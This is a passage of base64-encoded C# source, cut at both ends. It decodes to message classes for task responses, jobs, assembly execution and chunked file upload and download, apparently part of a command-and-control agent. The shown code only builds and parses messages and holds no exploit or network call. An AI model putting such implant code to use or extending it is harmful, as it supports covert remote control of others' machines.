lcnJvciB7IGdldDsgc2V0OyB9DQogICAgICAgICAgICBwdWJsaWMgc3RyaW5nIGZpbGVfaWQgeyBnZXQ7IHNldDt9DQoNCiAgICAgICAgICAgIHB1YmxpYyBzdGF0aWMgc3RyaW5nIFJlc3BvbnNlU3VjY2Vzc0Zvcm1hdCA9IEAie3siInN0YXR1cyIiOiAiInswfSIiLCAiInRhc2tfaWQiIjogIiJ7MX0iIn19IjsNCiAgICAgICAgICAgIHB1YmxpYyBzdGF0aWMgc3RyaW5nIFJlc3BvbnNlRXJyb3JGb3JtYXQgPSBAInt7IiJzdGF0dXMiIjogIiJ7MH0iIiwgIiJ0YXNrX2lkIiI6ICIiezF9IiIsICIiZXJyb3IiIjogIiJ7Mn0iIn19IjsNCiAgICAgICAgICAgIHB1YmxpYyBzdGF0aWMgc3RyaW5nIFJlc3BvbnNlRG93bmxvYWRGb3JtYXQgPSBAInt7IiJzdGF0dXMiIjogIiJ7MH0iIiwgIiJ0YXNrX2lkIiI6ICIiezF9IiIsICIiZmlsZV9pZCIiOiAiInsyfSIifX0iOw0KDQogICAgICAgICAgICBwdWJsaWMgc3RhdGljIExpc3Q8c3RyaW5nPiBQYXJzZVN1Y2Nlc3Moc3RyaW5nIGRhdGEsIHN0cmluZyBmb3JtYXQpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgZm9ybWF0ID0gUmVnZXguRXNjYXBlKGZvcm1hdCkuUmVwbGFjZSgiXFx7IiwgInsiKTsNCiAgICAgICAgICAgICAgICBpZiAoZm9ybWF0LkNvbnRhaW5zKCJ7MH0iKSkgeyBmb3JtYXQgPSBmb3JtYXQuUmVwbGFjZSgiezB9IiwgIig\/J2dyb3VwMCcuKikiKTsgfQ0KICAgICAgICAgICAgICAgIGlmIChmb3JtYXQuQ29udGFpbnMoInsxfSIpKSB7IGZvcm1hdCA9IGZvcm1hdC5SZXBsYWNlKCJ7MX0iLCAiKD8nZ3JvdXAxJy4qKSIpOyB9DQogICAgICAgICAgICAgICAgTWF0Y2ggbWF0Y2ggPSBuZXcgUmVnZXgoZm9ybWF0KS5NYXRjaChkYXRhKTsNCiAgICAgICAgICAgICAgICBMaXN0PHN0cmluZz4gbWF0Y2hlcyA9IG5ldyBMaXN0PHN0cmluZz4oKTsNCiAgICAgICAgICAgICAgICBpZiAobWF0Y2guR3JvdXBzWyJncm91cDAiXSAhPSBudWxsKSB7IG1hdGNoZXMuQWRkKG1hdGNoLkdyb3Vwc1siZ3JvdXAwIl0uVmFsdWUpOyB9DQogICAgICAgICAgICAgICAgaWYgKG1hdGNoLkdyb3Vwc1siZ3JvdXAxIl0gIT0gbnVsbCkgeyBtYXRjaGVzLkFkZChtYXRjaC5Hcm91cHNbImdyb3VwMSJdLlZhbHVlKTsgfQ0KICAgICAgICAgICAgICAgIHJldHVybiBtYXRjaGVzOw0KICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICBwdWJsaWMgc3RhdGljIExpc3Q8c3RyaW5nPiBQYXJzZUVycm9yKHN0cmluZyBkYXRhLCBzdHJpbmcgZm9ybWF0KQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIGZvcm1hdCA9IFJlZ2V4LkVzY2FwZShmb3JtYXQpLlJlcGxhY2UoIlxceyIsICJ7Iik7DQogICAgICAgICAgICAgICAgaWYgKGZvcm1hdC5Db250YWlucygiezB9IikpIHsgZm9ybWF0ID0gZm9ybWF0LlJlcGxhY2UoInswfSIsICIoPydncm91cDAnLiopIik7IH0NCiAgICAgICAgICAgICAgICBpZiAoZm9ybWF0LkNvbnRhaW5zKCJ7MX0iKSkgeyBmb3JtYXQgPSBmb3JtYXQuUmVwbGFjZSgiezF9IiwgIig\/J2dyb3VwMScuKikiKTsgfQ0KICAgICAgICAgICAgICAgIGlmIChmb3JtYXQuQ29udGFpbnMoInsyfSIpKSB7IGZvcm1hdCA9IGZvcm1hdC5SZXBsYWNlKCJ7Mn0iLCAiKD8nZ3JvdXAyJy4qKSIpOyB9DQogICAgICAgICAgICAgICAgTWF0Y2ggbWF0Y2ggPSBuZXcgUmVnZXgoZm9ybWF0KS5NYXRjaChkYXRhKTsNCiAgICAgICAgICAgICAgICBMaXN0PHN0cmluZz4gbWF0Y2hlcyA9IG5ldyBMaXN0PHN0cmluZz4oKTsNCiAgICAgICAgICAgICAgICBpZiAobWF0Y2guR3JvdXBzWyJncm91cDAiXSAhPSBudWxsKSB7IG1hdGNoZXMuQWRkKG1hdGNoLkdyb3Vwc1siZ3JvdXAwIl0uVmFsdWUpOyB9DQogICAgICAgICAgICAgICAgaWYgKG1hdGNoLkdyb3Vwc1siZ3JvdXAxIl0gIT0gbnVsbCkgeyBtYXRjaGVzLkFkZChtYXRjaC5Hcm91cHNbImdyb3VwMSJdLlZhbHVlKTsgfQ0KICAgICAgICAgICAgICAgIGlmIChtYXRjaC5Hcm91cHNbImdyb3VwMiJdICE9IG51bGwpIHsgbWF0Y2hlcy5BZGQobWF0Y2guR3JvdXBzWyJncm91cDIiXS5WYWx1ZSk7IH0NCiAgICAgICAgICAgICAgICByZXR1cm4gbWF0Y2hlczsNCiAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgcHVibGljIHN0YXRpYyBMaXN0PFJlc3BvbnNlPiBQYXJzZVJlc3BvbnNlcyhzdHJpbmcgcmVzcG9uc2VzX2pzb24pDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgaWYgKHJlc3BvbnNlc19qc29uID09ICJbXSIpDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICByZXR1cm4gbnVsbDsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgZWxzZQ0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgcmVzcG9uc2VzX2pzb24gPSByZXNwb25zZXNfanNvbi5SZXBsYWNlKCJbIiwgQCIiKS5SZXBsYWNlKCJdIiwgQCIiKTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgTGlzdDxSZXNwb25zZT4gcmVzcG9uc2VzID0gbmV3IExpc3Q8UmVzcG9uc2U+KCk7DQogICAgICAgICAgICAgICAgc3RyaW5nW10gcmVzcG9uc2VzX3NwbGl0ID0gcmVzcG9uc2VzX2pzb24uU3BsaXQobmV3W10geyAifSwiIH0sIFN0cmluZ1NwbGl0T3B0aW9ucy5SZW1vdmVFbXB0eUVudHJpZXMpOw0KICAgICAgICAgICAgICAgIGZvcmVhY2ggKHN0cmluZyByZXNwb25zZSBpbiByZXNwb25zZXNfc3BsaXQpDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICBMaXN0PHN0cmluZz4gcGFyc2VMaXN0ID0gbmV3IExpc3Q8c3RyaW5nPiB7IH07DQogICAgICAgICAgICAgICAgICAgIGlmIChyZXNwb25zZS5Db250YWlucygiZXJyb3IiKSkNCiAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgcGFyc2VMaXN0ID0gUmVzcG9uc2UuUGFyc2VFcnJvcihyZXNwb25zZSwgUmVzcG9uc2VFcnJvckZvcm1hdC5SZXBsYWNlKCJ7eyIsICJ7IikuUmVwbGFjZSgifX0iLCAifSIpKTsNCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChwYXJzZUxpc3QuQ291bnQgIT0gMykgeyByZXR1cm4gbnVsbDsgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgUmVzcG9uc2UgbmV3X3Jlc3BvbnNlID0gbmV3IFJlc3BvbnNlDQogICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgc3RhdHVzID0gcGFyc2VMaXN0WzBdLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRhc2tfaWQgPSBwYXJzZUxpc3RbMV0sDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZXJyb3IgPSBwYXJzZUxpc3RbMl0NCiAgICAgICAgICAgICAgICAgICAgICAgIH07DQogICAgICAgICAgICAgICAgICAgICAgICByZXNwb25zZXMuQWRkKG5ld19yZXNwb25zZSk7DQogICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgZWxzZSBpZiAocmVzcG9uc2UuQ29udGFpbnMoImZpbGVfaWQiKSkNCiAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgcGFyc2VMaXN0ID0gUmVzcG9uc2UuUGFyc2VFcnJvcihyZXNwb25zZSwgUmVzcG9uc2VEb3dubG9hZEZvcm1hdC5SZXBsYWNlKCJ7eyIsICJ7IikuUmVwbGFjZSgifX0iLCAifSIpKTsNCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChwYXJzZUxpc3QuQ291bnQgIT0gMykgeyByZXR1cm4gbnVsbDsgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgUmVzcG9uc2UgbmV3X3Jlc3BvbnNlID0gbmV3IFJlc3BvbnNlDQogICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgc3RhdHVzID0gcGFyc2VMaXN0WzBdLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRhc2tfaWQgPSBwYXJzZUxpc3RbMV0sDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZmlsZV9pZCA9IHBhcnNlTGlzdFsyXQ0KICAgICAgICAgICAgICAgICAgICAgICAgfTsNCiAgICAgICAgICAgICAgICAgICAgICAgIHJlc3BvbnNlcy5BZGQobmV3X3Jlc3BvbnNlKTsNCiAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICBlbHNlDQogICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIHBhcnNlTGlzdCA9IFJlc3BvbnNlLlBhcnNlU3VjY2VzcyhyZXNwb25zZSArICJ9IiwgUmVzcG9uc2VTdWNjZXNzRm9ybWF0LlJlcGxhY2UoInt7IiwgInsiKS5SZXBsYWNlKCJ9fSIsICJ9IikpOw0KICAgICAgICAgICAgICAgICAgICAgICAgcGFyc2VMaXN0LkFkZCgiIik7DQogICAgICAgICAgICAgICAgICAgICAgICBpZiAocGFyc2VMaXN0LkNvdW50ICE9IDMpIHsgcmV0dXJuIG51bGw7IH0NCiAgICAgICAgICAgICAgICAgICAgICAgIFJlc3BvbnNlIG5ld19yZXNwb25zZSA9IG5ldyBSZXNwb25zZQ0KICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHN0YXR1cyA9IHBhcnNlTGlzdFswXSwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB0YXNrX2lkID0gcGFyc2VMaXN0WzFdLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVycm9yID0gcGFyc2VMaXN0WzJdDQogICAgICAgICAgICAgICAgICAgICAgICB9Ow0KICAgICAgICAgICAgICAgICAgICAgICAgcmVzcG9uc2VzLkFkZChuZXdfcmVzcG9uc2UpOw0KICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIHJldHVybiByZXNwb25zZXM7DQogICAgICAgICAgICB9DQogICAgICAgIH0NCg0KICAgICAgICBwdWJsaWMgY2xhc3MgSm9iTGlzdA0KICAgICAgICB7DQogICAgICAgICAgICBwdWJsaWMgaW50IGpvYl9jb3VudCB7IGdldDsgc2V0OyB9DQogICAgICAgICAgICBwdWJsaWMgTGlzdDxKb2I+IGpvYnMgeyBnZXQ7IHNldDsgfQ0KDQogICAgICAgICAgICBwdWJsaWMgSm9iTGlzdCgpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgam9icyA9IG5ldyBMaXN0PEpvYj4oKTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KDQogICAgICAgIHB1YmxpYyBjbGFzcyBKb2INCiAgICAgICAgew0KICAgICAgICAgICAgcHVibGljIGludCBqb2JfaWQgeyBnZXQ7IHNldDsgfQ0KICAgICAgICAgICAgcHVibGljIHN0cmluZyB0YXNrX2lkIHsgZ2V0OyBzZXQ7IH0NCiAgICAgICAgICAgIHB1YmxpYyBib29sIGNvbXBsZXRlZCB7IGdldDsgc2V0OyB9DQogICAgICAgICAgICBwdWJsaWMgYm9vbCBqb2Jfc3RhcnRlZCB7IGdldDsgc2V0OyB9DQogICAgICAgICAgICBwdWJsaWMgYm9vbCBzdWNjZXNzIHsgZ2V0OyBzZXQ7IH0NCiAgICAgICAgICAgIHB1YmxpYyBzdHJpbmcgY29tbWFuZCB7IGdldDsgc2V0OyB9DQogICAgICAgICAgICBwdWJsaWMgc3RyaW5nIHBhcmFtZXRlcnMgeyBnZXQ7IHNldDsgfQ0KICAgICAgICAgICAgcHVibGljIHN0cmluZyByZXNwb25zZSB7IGdldDsgc2V0OyB9DQogICAgICAgICAgICBwdWJsaWMgVGhyZWFkIHRocmVhZCB7IGdldDsgc2V0OyB9DQogICAgICAgICAgICBwdWJsaWMgYm9vbCB1cGxvYWQgeyBnZXQ7IHNldDsgfQ0KICAgICAgICAgICAgcHVibGljIGJvb2wgZG93bmxvYWQgeyBnZXQ7IHNldDsgfQ0KICAgICAgICAgICAgcHVibGljIGJvb2wgY2h1bmtpbmdfc3RhcnRlZCB7IGdldDsgc2V0OyB9DQogICAgICAgICAgICBwdWJsaWMgaW50IHRvdGFsX2NodW5rcyB7IGdldDsgc2V0OyB9DQogICAgICAgICAgICBwdWJsaWMgaW50IGNodW5rX251bSB7IGdldDsgc2V0OyB9DQogICAgICAgICAgICBwdWJsaWMgaW50IHdyaXRlX251bSB7IGdldDsgc2V0OyB9DQogICAgICAgICAgICBwdWJsaWMgc3RyaW5nIGZpbGVfaWQgeyBnZXQ7IHNldDsgfQ0KICAgICAgICAgICAgcHVibGljIGxvbmcgZmlsZV9zaXplIHsgZ2V0OyBzZXQ7IH0NCiAgICAgICAgICAgIHB1YmxpYyBzdHJpbmcgcGF0aCB7IGdldDsgc2V0OyB9DQogICAgICAgICAgICBwdWJsaWMgTGlzdDxzdHJpbmc+IGNodW5rcyB7IGdldDsgc2V0OyB9DQoNCiAgICAgICAgICAgIHB1YmxpYyBKb2IoKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIGNodW5rcyA9IG5ldyBMaXN0PHN0cmluZz4oKTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KDQogICAgICAgIHB1YmxpYyBjbGFzcyBVcGxvYWRUYXNraW5nDQogICAgICAgIHsNCiAgICAgICAgICAgIHB1YmxpYyBzdHJpbmcgYXNzZW1ibHlfaWQgeyBnZXQ7IHNldDsgfQ0KICAgICAgICAgICAgcHVibGljIHN0cmluZyByZW1vdGVfcGF0aCB7IGdldDsgc2V0OyB9DQoNCiAgICAgICAgICAgIHB1YmxpYyBzdGF0aWMgc3RyaW5nIFVwbG9hZFRhc2tpbmdGb3JtYXQgPSBAIiIiYXNzZW1ibHlfaWQiIjogIiJ7MH0iIiwgIiJyZW1vdGVfcGF0aCIiOiAiInsxfSIiIjsNCg0KICAgICAgICAgICAgcHVibGljIHN0YXRpYyBMaXN0PHN0cmluZz4gUGFyc2Uoc3RyaW5nIGRhdGEsIHN0cmluZyBmb3JtYXQpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgZm9ybWF0ID0gUmVnZXguRXNjYXBlKGZvcm1hdCkuUmVwbGFjZSgiXFwiLCBAIiIpOw0KICAgICAgICAgICAgICAgIGlmIChmb3JtYXQuQ29udGFpbnMoInswfSIpKSB7IGZvcm1hdCA9IGZvcm1hdC5SZXBsYWNlKCJ7MH0iLCAiKD8nZ3JvdXAwJy4qKSIpOyB9DQogICAgICAgICAgICAgICAgaWYgKGZvcm1hdC5Db250YWlucygiezF9IikpIHsgZm9ybWF0ID0gZm9ybWF0LlJlcGxhY2UoInsxfSIsICIoPydncm91cDEnLiopIik7IH0NCiAgICAgICAgICAgICAgICBNYXRjaCBtYXRjaCA9IG5ldyBSZWdleChmb3JtYXQpLk1hdGNoKGRhdGEuUmVwbGFjZShAIlwiLCBAIiIpKTsNCiAgICAgICAgICAgICAgICBMaXN0PHN0cmluZz4gbWF0Y2hlcyA9IG5ldyBMaXN0PHN0cmluZz4oKTsNCiAgICAgICAgICAgICAgICBpZiAobWF0Y2guR3JvdXBzWyJncm91cDAiXSAhPSBudWxsKSB7IG1hdGNoZXMuQWRkKG1hdGNoLkdyb3Vwc1siZ3JvdXAwIl0uVmFsdWUpOyB9DQogICAgICAgICAgICAgICAgaWYgKG1hdGNoLkdyb3Vwc1siZ3JvdXAxIl0gIT0gbnVsbCkgeyBtYXRjaGVzLkFkZChtYXRjaC5Hcm91cHNbImdyb3VwMSJdLlZhbHVlKTsgfQ0KICAgICAgICAgICAgICAgIHJldHVybiBtYXRjaGVzOw0KICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICBwdWJsaWMgc3RhdGljIFVwbG9hZFRhc2tpbmcgRnJvbUpzb24oc3RyaW5nIG1lc3NhZ2UpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgTGlzdDxzdHJpbmc+IHBhcnNlTGlzdCA9IFVwbG9hZFRhc2tpbmcuUGFyc2UobWVzc2FnZSwgVXBsb2FkVGFza2luZ0Zvcm1hdCk7DQogICAgICAgICAgICAgICAgaWYgKHBhcnNlTGlzdC5Db3VudCAhPSAyKSB7IHJldHVybiBudWxsOyB9DQogICAgICAgICAgICAgICAgcmV0dXJuIG5ldyBVcGxvYWRUYXNraW5nDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICBhc3NlbWJseV9pZCA9IHBhcnNlTGlzdFswXSwNCiAgICAgICAgICAgICAgICAgICAgcmVtb3RlX3BhdGggPSBwYXJzZUxpc3RbMV0NCiAgICAgICAgICAgICAgICB9Ow0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQoNCiAgICAgICAgcHVibGljIGNsYXNzIFJ1bkFzc2VtYmx5DQogICAgICAgIHsNCiAgICAgICAgICAgIHB1YmxpYyBzdHJpbmcgYXJncyB7IGdldDsgc2V0OyB9DQogICAgICAgICAgICBwdWJsaWMgc3RyaW5nIGFzc2VtYmx5X2lkIHsgZ2V0OyBzZXQ7IH0NCg0KICAgICAgICAgICAgcHVibGljIHN0YXRpYyBzdHJpbmcgUnVuQXNzZW1ibHlGb3JtYXQgPSBAIiIiYXNzZW1ibHlfaWQiIjogIiJ7MH0iIiwgIiJhcmdzIiI6ICIiezF9IiIiOw0KDQogICAgICAgICAgICBwdWJsaWMgc3RhdGljIExpc3Q8c3RyaW5nPiBQYXJzZShzdHJpbmcgZGF0YSwgc3RyaW5nIGZvcm1hdCkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBmb3JtYXQgPSBSZWdleC5Fc2NhcGUoZm9ybWF0KS5SZXBsYWNlKCJcXCIsIEAiIik7DQogICAgICAgICAgICAgICAgaWYgKGZvcm1hdC5Db250YWlucygiezB9IikpIHsgZm9ybWF0ID0gZm9ybWF0LlJlcGxhY2UoInswfSIsICIoPydncm91cDAnLiopIik7IH0NCiAgICAgICAgICAgICAgICBpZiAoZm9ybWF0LkNvbnRhaW5zKCJ7MX0iKSkgeyBmb3JtYXQgPSBmb3JtYXQuUmVwbGFjZSgiezF9IiwgIig\/J2dyb3VwMScuKikiKTsgfQ0KICAgICAgICAgICAgICAgIE1hdGNoIG1hdGNoID0gbmV3IFJlZ2V4KGZvcm1hdCkuTWF0Y2goZGF0YS5SZXBsYWNlKEAiXCIsIEAiIikpOw0KICAgICAgICAgICAgICAgIExpc3Q8c3RyaW5nPiBtYXRjaGVzID0gbmV3IExpc3Q8c3RyaW5nPigpOw0KICAgICAgICAgICAgICAgIGlmIChtYXRjaC5Hcm91cHNbImdyb3VwMCJdICE9IG51bGwpIHsgbWF0Y2hlcy5BZGQobWF0Y2guR3JvdXBzWyJncm91cDAiXS5WYWx1ZSk7IH0NCiAgICAgICAgICAgICAgICBpZiAobWF0Y2guR3JvdXBzWyJncm91cDEiXSAhPSBudWxsKSB7IG1hdGNoZXMuQWRkKG1hdGNoLkdyb3Vwc1siZ3JvdXAxIl0uVmFsdWUpOyB9DQogICAgICAgICAgICAgICAgcmV0dXJuIG1hdGNoZXM7DQogICAgICAgICAgICB9DQoNCiAgICAgICAgICAgIHB1YmxpYyBzdGF0aWMgUnVuQXNzZW1ibHkgRnJvbUpzb24oc3RyaW5nIG1lc3NhZ2UpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgTGlzdDxzdHJpbmc+IHBhcnNlTGlzdCA9IFJ1bkFzc2VtYmx5LlBhcnNlKG1lc3NhZ2UsIFJ1bkFzc2VtYmx5Rm9ybWF0KTsNCiAgICAgICAgICAgICAgICBpZiAocGFyc2VMaXN0LkNvdW50ICE9IDIpIHsgcmV0dXJuIG51bGw7IH0NCiAgICAgICAgICAgICAgICByZXR1cm4gbmV3IFJ1bkFzc2VtYmx5DQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICBhcmdzID0gcGFyc2VMaXN0WzFdLA0KICAgICAgICAgICAgICAgICAgICBhc3NlbWJseV9pZCA9IHBhcnNlTGlzdFswXQ0KICAgICAgICAgICAgICAgIH07DQogICAgICAgICAgICB9DQogICAgICAgIH0NCg0KICAgICAgICBwdWJsaWMgY2xhc3MgVXBsb2FkDQogICAgICAgIHsNCiAgICAgICAgICAgIHB1YmxpYyBzdHJpbmcgYWN0aW9uIHsgZ2V0OyBzZXQ7IH0NCiAgICAgICAgICAgIHB1YmxpYyBpbnQgY2h1bmtfc2l6ZSB7IGdldDsgc2V0OyB9DQogICAgICAgICAgICBwdWJsaWMgc3RyaW5nIGZpbGVfaWQgeyBnZXQ7IHNldDsgfQ0KICAgICAgICAgICAgcHVibGljIGludCBjaHVua19udW0geyBnZXQ7IHNldDsgfQ0KICAgICAgICAgICAgcHVibGljIHN0cmluZyBmdWxsX3BhdGggeyBnZXQ7IHNldDsgfQ0KICAgICAgICAgICAgcHVibGljIHN0cmluZyB0YXNrX2lkIHsgZ2V0OyBzZXQ7IH0NCg0KICAgICAgICAgICAgcHVibGljIHN0cmluZyBKc29uRm9ybWF0ID0gQCJ7eyIiYWN0aW9uIiI6IiJ7MH0iIiwiImNodW5rX3NpemUiIjp7MX0sIiJmaWxlX2lkIiI6IiJ7Mn0iIiwiImNodW5rX251bSIiOnszfSwgIiJmdWxsX3BhdGgiIjogIiJ7NH0iIiwiInRhc2tfaWQiIjoiIns1fSIifX0iOw0KDQogICAgICAgICAgICBwdWJsaWMgc3RhdGljIHN0cmluZyBUb0pzb24oVXBsb2FkIHVwbG9hZCkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICByZXR1cm4gU3RyaW5nLkZvcm1hdCgNCiAgICAgICAgICAgICAgICAgICAgdXBsb2FkLkpzb25Gb3JtYXQsDQogICAgICAgICAgICAgICAgICAgIEphdmFTY3JpcHRTdHJpbmdFbmNvZGUodXBsb2FkLmFjdGlvbiksDQogICAgICAgICAgICAgICAgICAgIEphdmFTY3JpcHRTdHJpbmdFbmNvZGUodXBsb2FkLmNodW5rX3NpemUuVG9TdHJpbmcoKSksDQogICAgICAgICAgICAgICAgICAgIEphdmFTY3JpcHRTdHJpbmdFbmNvZGUodXBsb2FkLmZpbGVfaWQpLA0KICAgICAgICAgICAgICAgICAgICBKYXZhU2NyaXB0U3RyaW5nRW5jb2RlKHVwbG9hZC5jaHVua19udW0uVG9TdHJpbmcoKSksDQogICAgICAgICAgICAgICAgICAgIEphdmFTY3JpcHRTdHJpbmdFbmNvZGUodXBsb2FkLmZ1bGxfcGF0aCksDQogICAgICAgICAgICAgICAgICAgIEphdmFTY3JpcHRTdHJpbmdFbmNvZGUodXBsb2FkLnRhc2tfaWQpDQogICAgICAgICAgICAgICAgKTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgICAgICANCiAgICAgICAgcHVibGljIGNsYXNzIFVwbG9hZFJlc3BvbnNlDQogICAgICAgIHsNCiAgICAgICAgICAgIHB1YmxpYyBzdHJpbmcgYWN0aW9uIHsgZ2V0OyBzZXQ7IH0NCiAgICAgICAgICAgIHB1YmxpYyBpbnQgdG90YWxfY2h1bmtzIHsgZ2V0OyBzZXQ7IH0NCiAgICAgICAgICAgIHB1YmxpYyBpbnQgY2h1bmtfbnVtIHsgZ2V0OyBzZXQ7IH0NCiAgICAgICAgICAgIHB1YmxpYyBzdHJpbmcgY2h1bmtfZGF0YSB7IGdldDsgc2V0OyB9DQogICAgICAgICAgICBwdWJsaWMgc3RyaW5nIGZpbGVfaWQgeyBnZXQ7IHNldDsgfQ0KICAgICAgICAgICAgcHVibGljIHN0cmluZyB0YXNrX2lkIHsgZ2V0OyBzZXQ7IH0NCg0KICAgICAgICAgICAgcHVibGljIHN0YXRpYyBzdHJpbmcgVXBsb2FkUmVzcG9uc2VGb3JtYXQgPSBAInt7IiJhY3Rpb24iIjogIiJ7MH0iIiwgIiJ0b3RhbF9jaHVua3MiIjogezF9LCAiImNodW5rX251bSIiOiB7Mn0sICIiY2h1bmtfZGF0YSIiOiAiInszfSIiLCAiImZpbGVfaWQiIjogIiJ7NH0iIiwgIiJ0YXNrX2lkIiI6ICIiezV9IiJ9fSI7DQoNCiAgICAgICAgICAgIHB1YmxpYyBzdGF0aWMgTGlzdDxzdHJpbmc+IFBhcnNlKHN0cmluZyBkYXRhLCBzdHJpbmcgZm9ybWF0KQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIGZvcm1hdCA9IFJlZ2V4LkVzY2FwZShmb3JtYXQpLlJlcGxhY2UoIlxceyIsIEAieyIpOw0KICAgICAgICAgICAgICAgIGlmIChmb3JtYXQuQ29udGFpbnMoInswfSIpKSB7IGZvcm1hdCA9IGZvcm1hdC5SZXBsYWNlKCJ7MH0iLCAiKD8nZ3JvdXAwJy4qKSIpOyB9DQogICAgICAgICAgICAgICAgaWYgKGZvcm1hdC5Db250YWlucygiezF9IikpIHsgZm9ybWF0ID0gZm9ybWF0LlJlcGxhY2UoInsxfSIsICIoPydncm91cDEnLiopIik7IH0NCiAgICAgICAgICAgICAgICBpZiAoZm9ybWF0LkNvbnRhaW5zKCJ7Mn0iKSkgeyBmb3JtYXQgPSBmb3JtYXQuUmVwbGFjZSgiezJ9IiwgIig\/J2dyb3VwMicuKikiKTsgfQ0KICAgICAgICAgICAgICAgIGlmIChmb3JtYXQuQ29udGFpbnMoInszfSIpKSB7IGZvcm1hdCA9IGZvcm1hdC5SZXBsYWNlKCJ7M30iLCAiKD8nZ3JvdXAzJy4qKSIpOyB9DQogICAgICAgICAgICAgICAgaWYgKGZvcm1hdC5Db250YWlucygiezR9IikpIHsgZm9ybWF0ID0gZm9ybWF0LlJlcGxhY2UoIns0fSIsICIoPydncm91cDQnLiopIik7IH0NCiAgICAgICAgICAgICAgICBpZiAoZm9ybWF0LkNvbnRhaW5zKCJ7NX0iKSkgeyBmb3JtYXQgPSBmb3JtYXQuUmVwbGFjZSgiezV9IiwgIig\/J2dyb3VwNScuKikiKTsgfQ0KICAgICAgICAgICAgICAgIE1hdGNoIG1hdGNoID0gbmV3IFJlZ2V4KGZvcm1hdCkuTWF0Y2goZGF0YS5SZXBsYWNlKEAiXCIsIEAiIikpOw0KICAgICAgICAgICAgICAgIExpc3Q8c3RyaW5nPiBtYXRjaGVzID0gbmV3IExpc3Q8c3RyaW5nPigpOw0KICAgICAgICAgICAgICAgIGlmIChtYXRjaC5Hcm91cHNbImdyb3VwMCJdICE9IG51bGwpIHsgbWF0Y2hlcy5BZGQobWF0Y2guR3JvdXBzWyJncm91cDAiXS5WYWx1ZSk7IH0NCiAgICAgICAgICAgICAgICBpZiAobWF0Y2guR3JvdXBzWyJncm91cDEiXSAhPSBudWxsKSB7IG1hdGNoZXMuQWRkKG1hdGNoLkdyb3Vwc1siZ3JvdXAxIl0uVmFsdWUpOyB9DQogICAgICAgICAgICAgICAgaWYgKG1hdGNoLkdyb3Vwc1siZ3JvdXAyIl0gIT0gbnVsbCkgeyBtYXRjaGVzLkFkZChtYXRjaC5Hcm91cHNbImdyb3VwMiJdLlZhbHVlKTsgfQ0KICAgICAgICAgICAgICAgIGlmIChtYXRjaC5Hcm91cHNbImdyb3VwMyJdICE9IG51bGwpIHsgbWF0Y2hlcy5BZGQobWF0Y2guR3JvdXBzWyJncm91cDMiXS5WYWx1ZSk7IH0NCiAgICAgICAgICAgICAgICBpZiAobWF0Y2guR3JvdXBzWyJncm91cDQiXSAhPSBudWxsKSB7IG1hdGNoZXMuQWRkKG1hdGNoLkdyb3Vwc1siZ3JvdXA0Il0uVmFsdWUpOyB9DQogICAgICAgICAgICAgICAgaWYgKG1hdGNoLkdyb3Vwc1siZ3JvdXA1Il0gIT0gbnVsbCkgeyBtYXRjaGVzLkFkZChtYXRjaC5Hcm91cHNbImdyb3VwNSJdLlZhbHVlKTsgfQ0KICAgICAgICAgICAgICAgIHJldHVybiBtYXRjaGVzOw0KICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICBwdWJsaWMgc3RhdGljIFVwbG9hZFJlc3BvbnNlIEZyb21Kc29uKHN0cmluZyBtZXNzYWdlKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIExpc3Q8c3RyaW5nPiBwYXJzZUxpc3QgPSBVcGxvYWRSZXNwb25zZS5QYXJzZShtZXNzYWdlLCBVcGxvYWRSZXNwb25zZUZvcm1hdC5SZXBsYWNlKCJ7eyIsICJ7IikuUmVwbGFjZSgifX0iLCAifSIpKTsNCiAgICAgICAgICAgICAgICBp